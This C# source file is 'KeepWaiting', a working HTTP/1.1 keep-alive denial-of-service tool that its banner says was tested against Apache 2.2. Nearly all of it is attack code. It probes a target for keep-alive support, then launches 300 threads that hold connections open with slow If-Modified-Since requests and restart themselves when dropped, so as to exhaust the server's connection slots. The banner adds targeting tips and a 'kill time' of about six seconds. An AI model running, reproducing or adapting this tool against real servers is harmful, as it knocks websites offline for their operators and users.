/*
      _----------------------------------------------------------_
     ||------+ KeepWaiting --- HTTP/1.1 Denial of Service +------||
     ||__________________________________________________________||
     ||--=[                                                  ]=--||
     ||--=[ Jeffrey L. Roberts / @phpDevOps / Nov 22th, 2014 ]=--||
     ||--=[                                                  ]=--||
     ||--=[ http://github.com/jeffreyroberts/KeepWaiting     ]=--||
     ||--=[                                                  ]=--||
     ||--=[ HTTP/1.1 KeepAlive Denial of Service             ]=--||
     ||--=[                                                  ]=--||
     ||--=[ Vendor: http://www.ietf.org/                     ]=--||
     ||--=[ Download: https://www.ietf.org/rfc/rfc2068.txt   ]=--||
     ||--=[                                                  ]=--||
     ||--=[ Tested Against Apache 2.2 on CentOS 6.4          ]=--||
     ||--=[                                                  ]=--||
     ||--=[ ProTip: Target the smallest static asset.        ]=--||
     ||--=[                                                  ]=--||
     ||--=[ Kill Time: Approximately 6 seconds.              ]=--||
     ||--=[                                                  ]=--||
     ||--=[ PS: When you rewrite this, don't forget to give  ]=--||
     ||--=[ credit where credit is due, have fun! =]         ]=--||
      -__________________________________________________________-
 */

using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.Runtime.InteropServices;

namespace KeepWaiting
{
    class Program
    {
        private static string sTargetHost;
        private static int iTargetPort;
        private static string sTargetPath;
        private static bool bHostname;

        static void Main(string[] args)
        {
            ShowBanner();
            
            if (args.Length != 1 || args[0].Contains("http://") == false || args[0].Replace("http://", "").Contains("/") == false)
            {
                ShowHelp();
                return;
            }

            string[] spTarget = args[0].ToLower().Replace("http://", "").Split('/');

            sTargetHost = spTarget[0];
            iTargetPort = 80;
            sTargetPath = args[0].ToLower().Replace("http://", "").Replace(spTarget[0], "");
            
            Console.WriteLine("  Targeting http://" + sTargetHost + sTargetPath);
            Console.WriteLine();
            Console.Write("  Testing Vulnerability: ");
             
            IsVulnerableClient isVulnerableClient = new IsVulnerableClient(sTargetHost, iTargetPort, sTargetPath);
            bool[] bVulnerable = isVulnerableClient.Start();
            bool bIsVulnerable = bVulnerable[0];
            bHostname = bVulnerable[1];

            if(bIsVulnerable == true)
            {
                Console.WriteLine("Target is vulnerable, spinning up threads.");
            }
            else
            {
                Console.WriteLine("Target not vulnerable, shutting down.");
                return;
            }

            Console.WriteLine();

            // Default MaxClients is 256, We use 300 to keep the target down during thread restarts
            int x = 0;
            while (x < 300)
            {
                KillerClient client = new KillerClient(sTargetHost, iTargetPort, sTargetPath, bHostname);
                client.fireNewThreadNeeded += client_fireNewThreadNeeded;
                client.Start();
                x++;

                System.Threading.Thread.Sleep(20);
            }

            Console.WriteLine("  Finished Launching Threads, Target should not respond to anymore requests.");
            Console.WriteLine();

            bool bContinue = true;

            while(bContinue == true)
            {
                System.Threading.Thread.Sleep(1000);
            }
        }

        static void client_fireNewThreadNeeded()
        {
            KillerClient client = new KillerClient(sTargetHost, iTargetPort, sTargetPath, bHostname);
            client.fireNewThreadNeeded+=client_fireNewThreadNeeded;
            client.Start();
        }

        static void ShowBanner()
        {
            Console.WriteLine("   _----------------------------------------------------------_");
            Console.WriteLine("  ||------+ KeepWaiting --- HTTP/1.1 Denial of Service +------||");
            Console.WriteLine("  ||__________________________________________________________||");
            Console.WriteLine("  ||--=[                                                  ]=--||");
            Console.WriteLine("  ||--=[ Jeffrey L. Roberts / @phpDevOps / Nov 22th, 2014 ]=--||");
            Console.WriteLine("  ||--=[                                                  ]=--||");
            Console.WriteLine("  ||--=[ http://github.com/jeffreyroberts/KeepWaiting     ]=--||");
            Console.WriteLine("  ||--=[                                                  ]=--||");
            Console.WriteLine("  ||--=[ Vendor: http://www.ietf.org/                     ]=--||");
            Console.WriteLine("  ||--=[ Download: https://www.ietf.org/rfc/rfc2068.txt   ]=--||");
            Console.WriteLine("  ||--=[                                                  ]=--||");
            Console.WriteLine("  ||--=[ Tested Against Apache 2.2 on CentOS 6.4          ]=--||");
            Console.WriteLine("  ||--=[                                                  ]=--||");
            Console.WriteLine("  ||--=[ ProTip: Target the smallest static asset.        ]=--||");
            Console.WriteLine("  ||--=[                                                  ]=--||");
            Console.WriteLine("  ||--=[ Kill Time: Approximately 6 seconds.              ]=--||");
            Console.WriteLine("   -__________________________________________________________-");
            Console.WriteLine();
        }

        static void ShowHelp()
        {
            ShowBanner();
            Console.WriteLine();
            Console.WriteLine("  Usage: KeepWaiting.exe <http_target_w_path>");
            Console.WriteLine();
            Console.WriteLine("  Example: KeepWaiting.exe http://www.example.tld/favicon.ico");
            Console.WriteLine();
            Console.WriteLine("  ProTip: Find a small static asset for the Target Path");
            Console.WriteLine();
        }
    }

    public class StateObject
    {
        public int iBufferSize = 1024;
        public byte[] bBuffer;
        public Socket client;
    }

    public class IsVulnerableClient
    {
        private string sTargetHost;
        private int iTargetPort;
        private string sTargetPath;

        public IsVulnerableClient(string host, int port, string path)
        {
            sTargetHost = host;
            iTargetPort = port;
            sTargetPath = path;
        }

        public bool[] Start()
        {
            bool bHostname = false;

            Socket client = null;

            try
            {
                IPHostEntry ipHostEntry = Dns.GetHostEntry(sTargetHost);
                client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                client.Connect(((EndPoint)new IPEndPoint(ipHostEntry.AddressList[0], iTargetPort)));
                bHostname = true;
            }
            catch
            {
                try
                {
                    client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    client.Connect(((EndPoint)new IPEndPoint(IPAddress.Parse(sTargetHost), iTargetPort)));
                }
                catch(Exception ex)
                {
                    Console.WriteLine("  Invalid Address.");
                    return new bool[] { false, bHostname };
                }
            }

            string sRequest = "GET " + sTargetPath + " HTTP/1.1\r\nHost: " + sTargetHost + "\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36\r\nAccept-Encoding: gzip,deflate,sdch\r\n";
            sRequest = sRequest + "Accept-Language: en-US,en;q=0.8\r\n\r\n";
            byte[] bRequest = System.Text.ASCIIEncoding.ASCII.GetBytes(sRequest);

            try
            {
                client.Send(bRequest);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());

                return new bool[] { false, bHostname };
            }

            string sHeaderResponse = GetHeaderResponse(ref client);

            if(sHeaderResponse.ToLower().Contains("keep-alive") == false)
            {
                return new bool[] { false, bHostname };;
            }
            else
            {
                return new bool[] { true, bHostname };
            }
        }

        private string GetHeaderResponse(ref Socket client)
        {
            StringBuilder sResponse = new StringBuilder();
            byte[] bBuffer = new byte[1];
            int bytesReceived = 0;

            try
            {
                bytesReceived = client.Receive(bBuffer);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return "";
            }

            while (bytesReceived > 0)
            {
                string chunk = System.Text.ASCIIEncoding.ASCII.GetString(bBuffer);
                sResponse.Append(chunk);

                if (sResponse.ToString().EndsWith("\r\n\r\n"))
                {
                    break;
                }

                bBuffer = new byte[1];
                bytesReceived = 0;

                try
                {
                    bytesReceived = client.Receive(bBuffer);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    return "";
                }
            }

            return sResponse.ToString();
        }

        private string ReturnByteArrayString(byte[] bArray, int length)
        {
            byte[] bReturnable = new byte[length];
            for (int x = 0; x < length; x++)
            {
                bReturnable[x] = bArray[x];
            }

            string sReturnable = System.Text.ASCIIEncoding.ASCII.GetString(bReturnable);

            return sReturnable;
        }
    }

    public class KillerClient
    {
        public delegate void NewThreadNeeded();
        public event NewThreadNeeded fireNewThreadNeeded;

        private Thread thread;

        private string sTargetHost;
        private int iTargetPort;
        private string sTargetPath;
        private bool bHostname;

        public KillerClient(string host, int port, string path, bool hostname)
        {
            bHostname = hostname;
            sTargetHost = host;
            iTargetPort = port;
            sTargetPath = path;
        }

        public void Start()
        {
            thread = new Thread(new ParameterizedThreadStart(start));
            thread.Start();
        }

        private void start(object obj)
        {
            Socket client = null;
            
            if (bHostname == true)
            {
                try
                {
                    IPHostEntry ipHostEntry = Dns.GetHostEntry(sTargetHost);
                    client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    client.Connect(((EndPoint)new IPEndPoint(ipHostEntry.AddressList[0], iTargetPort)));
                }
                catch
                {
                    fireNewThreadNeeded();
                    thread.Abort();
                }
            }
            else
            {
                try
                {
                    client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    client.Connect(((EndPoint)new IPEndPoint(IPAddress.Parse(sTargetHost), iTargetPort)));
                }
                catch (Exception ex)
                {
                    fireNewThreadNeeded();
                    thread.Abort();
                }
            }

            string sRequest = "GET " + sTargetPath + " HTTP/1.1\r\nHost: " + sTargetHost + "\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36\r\nAccept-Encoding: gzip,deflate,sdch\r\n";
            sRequest = sRequest + "Accept-Language: en-US,en;q=0.8\r\n\r\n";
            byte[] bRequest = System.Text.ASCIIEncoding.ASCII.GetBytes(sRequest);

            try
            {
                client.Send(bRequest);
            }
            catch (Exception ex)
            {
                fireNewThreadNeeded();
                thread.Abort();
            }

            string sHeaderResponse = GetHeaderResponse(ref client);

            string sCacheHeader = "";

            if (sHeaderResponse.ToString().Contains("Last-Modified"))
            {
                string sLastModified = sHeaderResponse.ToString().Replace("Last-Modified:", "!").Split('!')[1].Replace("\r", "!").Split('!')[0];
                sCacheHeader = "If-Modified-Since: " + sLastModified;
            }

            string sContentLength = sHeaderResponse.ToString().Replace("Content-Length:", "!").Split('!')[1].Replace("\r", "!").Split('!')[0];

            string sContentResponse = GetContentResponse(ref client, int.Parse(sContentLength.Trim()));
            int iContentResponseLength = sContentResponse.Length;


            sRequest = "GET " + sTargetPath + " HTTP/1.1\r\nHost: " + sTargetHost + "\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36\r\nAccept-Encoding: gzip,deflate,sdch\r\n";
            sRequest = sRequest + "Accept-Language: en-US,en;q=0.8\r\n" + sCacheHeader + "\r\n\r\n";
            bRequest = System.Text.ASCIIEncoding.ASCII.GetBytes(sRequest);

            System.Threading.Thread.Sleep(10000);

            client.Send(bRequest);

            sHeaderResponse = GetHeaderResponse(ref client);

            while (sHeaderResponse.Contains("304 Not Modified") == true)
            {
                client.Send(bRequest);

                sHeaderResponse = GetHeaderResponse(ref client);

                System.Threading.Thread.Sleep(10000);
            }

            fireNewThreadNeeded();
            thread.Abort();
        }

        private string GetHeaderResponse(ref Socket client)
        {
            StringBuilder sResponse = new StringBuilder();
            byte[] bBuffer = new byte[1];
            int bytesReceived = 0;

            try
            {
                bytesReceived = client.Receive(bBuffer);
            }
            catch (Exception ex)
            {
                fireNewThreadNeeded();
                thread.Abort();
            } 
            
            while (bytesReceived > 0)
            {
                string chunk = System.Text.ASCIIEncoding.ASCII.GetString(bBuffer);
                sResponse.Append(chunk);

                if (sResponse.ToString().EndsWith("\r\n\r\n"))
                {
                    break;
                }

                bBuffer = new byte[1];
                bytesReceived = 0;
                
                try
                {
                    bytesReceived = client.Receive(bBuffer);
                }
                catch(Exception ex)
                {
                    fireNewThreadNeeded();
                    thread.Abort();
                }
            }

            return sResponse.ToString();
        }

        private string GetContentResponse(ref Socket client, int iContentLength)
        {
            StringBuilder sbResponse = new StringBuilder();
            int iTotalBytesReceived = 0;

            byte[] bBuffer = new byte[iContentLength];
            int bytesReceived = 0;

            try
            {
                bytesReceived = client.Receive(bBuffer);
            }
            catch (Exception ex)
            {
                fireNewThreadNeeded();
                thread.Abort();
            }
            
            string chunk = ReturnByteArrayString(bBuffer, bytesReceived);
            sbResponse.Append(chunk);
            iTotalBytesReceived += bytesReceived;

            while (iTotalBytesReceived < iContentLength && bytesReceived > 0)
            {
                bBuffer = new byte[1];
                bytesReceived = 0;
                try
                {
                    bytesReceived = client.Receive(bBuffer);
                }
                catch (Exception ex)
                {
                    fireNewThreadNeeded();
                    thread.Abort();
                }
            
                chunk = System.Text.ASCIIEncoding.ASCII.GetString(bBuffer);
                sbResponse.Append(chunk);
                iTotalBytesReceived += bytesReceived;
            }

            return sbResponse.ToString();
        }

        private string ReturnByteArrayString(byte[] bArray, int length)
        {
            byte[] bReturnable = new byte[length];
            for (int x = 0; x < length; x++)
            {
                bReturnable[x] = bArray[x];
            }

            string sReturnable = System.Text.ASCIIEncoding.ASCII.GetString(bReturnable);

            return sReturnable;
        }
    }
}
